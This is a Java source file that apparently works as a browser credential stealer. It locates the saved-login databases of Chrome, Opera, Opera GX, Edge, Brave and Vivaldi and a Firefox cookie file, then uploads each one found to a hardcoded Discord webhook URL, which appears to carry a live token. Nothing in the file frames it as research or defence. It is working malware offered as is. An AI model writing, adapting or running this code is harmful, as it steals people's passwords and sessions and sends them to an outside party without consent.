package io.github.luxotick.impl;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.util.Base64;

import okhttp3.*;

public class web {
    public static void main(String[] args) {
        String webhookUrl = "https://discord.com/api/webhooks/1087418861504172132/yENsvgIwE432aQ6ASMzTn2TcRYxwW_ZuKQqRE34aFsqg3I1QzaOwrbFjbgAWLyRJKD-T"; // Replace with your webhook URL

        String chromePath = (System.getProperty("user.home")) + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
        String operaPath = (System.getProperty("user.home")) + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data";
        String operaGXPath = (System.getProperty("user.home")) + "\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Login Data";
        String firefoxPath = (System.getProperty("user.home")) + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\avionrhy.default-release\\storage\\default\\moz_cookies.sqlite";
        String edgePath = (System.getProperty("user.home")) + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data";
        String bravePath = (System.getProperty("user.home")) + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data";
        String vivaldiPath = (System.getProperty("user.home")) + "\\AppData\\Local\\Vivaldi\\User Data\\Default\\Login Data";


        File chrome = new File(chromePath);
        File opera = new File (operaPath);
        File firefox = new File(firefoxPath);
        File operagx = new File(operaGXPath);
        File edge = new File(edgePath);
        File brave = new File(bravePath);
        File vivaldi = new File(vivaldiPath);


        try {
            OkHttpClient client = new OkHttpClient();
            MultipartBody.Builder builder = new MultipartBody.Builder()
            .setType(MultipartBody.FORM);

            if (chrome.exists()){
                builder.addFormDataPart("file1", chrome.getName() + " Chrome" , RequestBody.create(MediaType.parse("application/octet-stream"), chrome));
            }else {
                builder.addFormDataPart("file1", "can't find chrome cookies.");
                RequestBody empty = RequestBody.create(null, new byte[]{});
                builder.addFormDataPart("file1", "can't find chrome cookies.", empty);
            }
            if (opera.exists()){
                builder.addFormDataPart("file2", opera.getName() + " Opera", RequestBody.create(MediaType.parse("application/octet-stream"), opera));
            }else {
                builder.addFormDataPart("file2", "can't find opera cookies.");
                RequestBody empty = RequestBody.create(null, new byte[]{});
                builder.addFormDataPart("file2", "can't find opera cookies.", empty);
            }
            if (firefox.exists()){
                builder.addFormDataPart("file3", firefox.getName() + " Firefox", RequestBody.create(MediaType.parse("application/octet-stream"), firefox));
            }else {
                builder.addFormDataPart("file3", "can't find firefox cookies.");
                RequestBody empty = RequestBody.create(null, new byte[]{});
                builder.addFormDataPart("file3", "can't find firefox cookies.", empty);
            }
            if (operagx.exists()){
                builder.addFormDataPart("file4", operagx.getName() + " OperaGX", RequestBody.create(MediaType.parse("application/octet-stream"), operagx));
            }else {
                builder.addFormDataPart("file4", "can't find opera gx cookies.");
                RequestBody empty = RequestBody.create(null, new byte[]{});
                builder.addFormDataPart("file4", "can't find operagx cookies.", empty);
            }
            if (edge.exists()){
                builder.addFormDataPart("file5", edge.getName() + " MicrosoftEdge", RequestBody.create(MediaType.parse("application/octet-stream"), edge));
            }else {
                builder.addFormDataPart("file5", "can't find edge cookies.");
                RequestBody empty = RequestBody.create(null, new byte[]{});
                builder.addFormDataPart("file5", "can't find msedge cookies.", empty);
            }
            if (brave.exists()){
                builder.addFormDataPart("file6", brave.getName() + " Brave", RequestBody.create(MediaType.parse("application/octet-stream"), brave));
            }else {
                builder.addFormDataPart("file6", "can't find brave cookies.");
                RequestBody empty = RequestBody.create(null, new byte[]{});
                builder.addFormDataPart("file6", "can't find brave cookies.", empty);
            }
            if (vivaldi.exists()){
                builder.addFormDataPart("file7", vivaldi.getName() + " Vivaldi", RequestBody.create(MediaType.parse("application/octet-stream"), vivaldi));
            }else {
                System.out.println("can't find vivaldi cookies.");
                RequestBody emptyBody = RequestBody.create(null, new byte[]{});
                builder.addFormDataPart("file7", "vivaldi does not exist", emptyBody);
            }
            RequestBody requestBody = builder.build();

            Request request = new Request.Builder()
                    .url(webhookUrl)
                    .post(requestBody)
                    .addHeader("Content-Type", "multipart/form-data")
                    .build();
            Response response = client.newCall(request).execute();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
}
